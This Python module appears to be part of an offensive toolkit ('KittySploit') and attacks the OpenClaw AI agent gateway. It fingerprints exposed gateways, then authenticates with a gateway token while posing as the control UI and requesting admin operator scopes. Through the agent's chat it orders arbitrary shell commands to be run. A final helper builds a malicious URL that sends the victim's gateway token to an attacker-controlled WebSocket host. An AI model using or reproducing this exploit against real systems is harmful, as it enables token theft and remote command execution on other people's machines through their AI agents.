#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OpenClaw gateway protocol helpers.

Implements HTTP fingerprinting and authenticated WebSocket command execution
against the OpenClaw AI agent gateway (default port 18789).
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple

import websocket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

GATEWAY_TOKEN_RE = re.compile(r"^[a-f0-9]{40,128}$", re.I)
OPENCLAW_MARKERS = ("openclaw", "clawdbot", "moltbot", "clawhub")
DEFAULT_PORT = 18789
FIXED_CVE_2026_25253 = (2026, 1, 29)


def parse_openclaw_version(raw: str) -> Optional[Tuple[int, ...]]:
    """Parse OpenClaw date-style versions like 2026.1.24-1 into a comparable tuple."""
    if not raw:
        return None
    text = str(raw).strip().lower()
    text = re.sub(r"-patch\.\d+", "", text)
    match = re.match(r"^(\d{4})\.(\d+)\.(\d+)(?:-(\d+))?", text)
    if not match:
        digits = [int(x) for x in re.findall(r"\d+", text)]
        return tuple(digits[:4]) if digits else None
    year, month, day, build = match.groups()
    parts = [int(year), int(month), int(day)]
    if build is not None:
        parts.append(int(build))
    return tuple(parts)


def version_lt(left: str, right: Tuple[int, ...]) -> bool:
    parsed = parse_openclaw_version(left)
    if not parsed:
        return False
    target = tuple(right)
    width = max(len(parsed), len(target))
    return parsed + (0,) * (width - len(parsed)) < target + (0,) * (width - len(target))


def _base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _build_device_auth_payload(
    *,
    version: str,
    device_id: str,
    client_id: str,
    client_mode: str,
    role: str,
    scopes: List[str],
    signed_at_ms: int,
    token: str,
    nonce: str = "",
) -> str:
    base = [
        version,
        device_id,
        client_id,
        client_mode,
        role,
        ",".join(scopes),
        str(signed_at_ms),
        token or "",
    ]
    if version == "v2":
        base.append(nonce or "")
    return "|".join(base)


class OpenClawGatewayClient:
    """Minimal OpenClaw gateway HTTP + WebSocket client."""

    def __init__(
        self,
        host: str,
        port: int = DEFAULT_PORT,
        ssl: bool = False,
        timeout: int = 15,
        verify_ssl: bool = False,
    ):
        self.host = host
        self.port = int(port)
        self.ssl = bool(ssl)
        self.timeout = int(timeout)
        self.verify_ssl = bool(verify_ssl)
        self.ws: Optional[websocket.WebSocket] = None

    @property
    def http_base(self) -> str:
        scheme = "https" if self.ssl else "http"
        return f"{scheme}://{self.host}:{self.port}"

    @property
    def ws_url(self) -> str:
        scheme = "wss" if self.ssl else "ws"
        return f"{scheme}://{self.host}:{self.port}/"

    def http_get(self, path: str) -> Tuple[int, str, Dict[str, Any]]:
        import urllib.error
        import urllib.request

        url = self.http_base + (path if path.startswith("/") else f"/{path}")
        req = urllib.request.Request(url, method="GET")
        ctx = None
        if self.ssl and not self.verify_ssl:
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            return exc.code, body, dict(exc.headers or {})
        except Exception as exc:
            raise ConnectionError(str(exc)) from exc

    @staticmethod
    def _looks_like_openclaw(doc: Dict[str, Any], raw_body: str) -> bool:
        lowered = raw_body.lower()
        if any(marker in lowered for marker in OPENCLAW_MARKERS):
            return True
        gateway = doc.get("gateway")
        if isinstance(gateway, dict) and gateway.get("port"):
            return True
        version = str(doc.get("version") or (gateway or {}).get("version") or "")
        return bool(re.match(r"^\d{4}\.\d+\.\d+", version))

    def fingerprint(self) -> Dict[str, Any]:
        """Probe /health and /status to identify an OpenClaw gateway."""
        info: Dict[str, Any] = {
            "detected": False,
            "service": "openclaw",
            "port": self.port,
            "version": "",
            "bind": "",
            "channels": [],
            "health_ok": False,
        }

        for path in ("/health", "/healthz", "/status"):
            try:
                status, body, _headers = self.http_get(path)
            except ConnectionError:
                continue
            if status not in (200, 204):
                continue

            doc: Dict[str, Any] = {}
            try:
                parsed = json.loads(body)
                if isinstance(parsed, dict):
                    doc = parsed
            except Exception:
                doc = {}

            if not self._looks_like_openclaw(doc, body):
                continue

            info["detected"] = True
            info["health_ok"] = True
            gateway = doc.get("gateway") if isinstance(doc.get("gateway"), dict) else {}
            info["version"] = str(doc.get("version") or gateway.get("version") or "")
            info["bind"] = str(gateway.get("bind") or "")
            channels = doc.get("channels")
            if isinstance(channels, list):
                info["channels"] = channels
            elif isinstance(channels, dict):
                info["channels"] = list(channels.keys())
            return info

        return info

    def ws_connect(self) -> None:
        kwargs: Dict[str, Any] = {"timeout": self.timeout}
        if self.ssl:
            if not self.verify_ssl:
                kwargs["sslopt"] = {"cert_reqs": 0, "check_hostname": False}
        self.ws = websocket.create_connection(self.ws_url, **kwargs)
        self.ws.settimeout(self.timeout)

    def ws_close(self) -> None:
        if self.ws:
            try:
                self.ws.close()
            finally:
                self.ws = None

    @staticmethod
    def _generate_device_identity() -> Dict[str, Any]:
        private_key = Ed25519PrivateKey.generate()
        public_key = private_key.public_key()
        raw_public = public_key.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw,
        )
        device_id = hashlib.sha256(raw_public).hexdigest()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()
        return {
            "device_id": device_id,
            "public_key_pem": public_pem,
            "private_key": private_key,
        }

    def _send_connect(self, token: str, nonce: str) -> str:
        if not self.ws:
            raise RuntimeError("WebSocket not connected")

        identity = self._generate_device_identity()
        signed_at = int(time.time() * 1000)
        scopes = ["operator.admin", "operator.approvals", "operator.pairing"]
        payload = _build_device_auth_payload(
            version="v2",
            device_id=identity["device_id"],
            client_id="clawdbot-control-ui",
            client_mode="webchat",
            role="operator",
            scopes=scopes,
            signed_at_ms=signed_at,
            token=token,
            nonce=nonce,
        )
        signature = _base64url(identity["private_key"].sign(payload.encode()))
        req_id = str(uuid.uuid4())
        message = {
            "type": "req",
            "id": req_id,
            "method": "connect",
            "params": {
                "minProtocol": 3,
                "maxProtocol": 3,
                "client": {
                    "id": "clawdbot-control-ui",
                    "version": "dev",
                    "platform": "kittysploit",
                    "mode": "webchat",
                },
                "role": "operator",
                "scopes": scopes,
                "device": {
                    "id": identity["device_id"],
                    "publicKey": identity["public_key_pem"],
                    "signature": signature,
                    "signedAt": signed_at,
                    "nonce": nonce,
                },
                "auth": {"token": token},
                "userAgent": "KittySploit/OpenClawGatewayClient",
                "locale": "en-US",
            },
        }
        self.ws.send(json.dumps(message))
        return req_id

    def _send_chat(self, command: str, session_key: str = "agent:main:main") -> str:
        if not self.ws:
            raise RuntimeError("WebSocket not connected")
        req_id = str(uuid.uuid4())
        message = {
            "type": "req",
            "id": req_id,
            "method": "chat.send",
            "params": {
                "sessionKey": session_key,
                "message": f"execute the command `{command}` and show me its output",
                "deliver": False,
                "idempotencyKey": str(uuid.uuid4()),
            },
        }
        self.ws.send(json.dumps(message))
        return req_id

    @staticmethod
    def _extract_chat_output(data: Dict[str, Any]) -> str:
        payload = data.get("payload") or {}
        message = payload.get("message") or {}
        content = message.get("content")
        if isinstance(content, list) and content:
            first = content[0]
            if isinstance(first, dict) and first.get("text"):
                return str(first["text"])
        if isinstance(content, str):
            return content
        return ""

    def execute_command(
        self,
        token: str,
        command: str,
        *,
        session_key: str = "agent:main:main",
        max_messages: int = 30,
    ) -> Dict[str, Any]:
        """
        Authenticate to the gateway and ask the agent to run a shell command.

        Returns a dict with keys: success, output, error.
        """
        if not GATEWAY_TOKEN_RE.fullmatch(str(token or "").strip()):
            return {"success": False, "output": "", "error": "Invalid gateway token format"}

        output_parts: List[str] = []
        connected = False
        try:
            self.ws_connect()
            for _ in range(max_messages):
                raw = self.ws.recv()
                if not raw:
                    break
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue

                if data.get("type") == "event" and data.get("event") == "connect.challenge":
                    nonce = str((data.get("payload") or {}).get("nonce") or "")
                    self._send_connect(token.strip(), nonce)
                    continue

                if data.get("type") == "res" and data.get("ok") is True:
                    payload = data.get("payload") or {}
                    if payload.get("type") == "hello-ok":
                        connected = True
                        self._send_chat(command, session_key=session_key)
                        continue

                if data.get("type") == "event" and data.get("event") == "chat":
                    text = self._extract_chat_output(data)
                    if text:
                        output_parts.append(text)
                        return {"success": True, "output": text, "error": ""}

                if data.get("type") == "res" and data.get("ok") is False:
                    err = (data.get("error") or {}).get("message") or "connect failed"
                    return {"success": False, "output": "", "error": err}

            if connected and output_parts:
                return {"success": True, "output": "\n".join(output_parts), "error": ""}
            if connected:
                return {
                    "success": True,
                    "output": "",
                    "error": "Command dispatched; no chat output captured (callback payload may still run)",
                }
            return {"success": False, "output": "", "error": "Gateway did not complete authentication handshake"}
        finally:
            self.ws_close()

    @staticmethod
    def build_token_exfil_url(
        victim_gateway_ui: str,
        attacker_ws_url: str,
    ) -> str:
        """
        Build a malicious Control UI URL for CVE-2026-25253 token exfiltration.

        victim_gateway_ui: e.g. http://127.0.0.1:18789/
        attacker_ws_url: attacker-controlled ws(s) endpoint, e.g. wss://attacker.example/exfil
        """
        base = victim_gateway_ui.strip()
        if not base.endswith("/"):
            base = f"{base}/"
        if "?" in base:
            return f"{base}&gatewayUrl={attacker_ws_url}"
        return f"{base}?gatewayUrl={attacker_ws_url}"
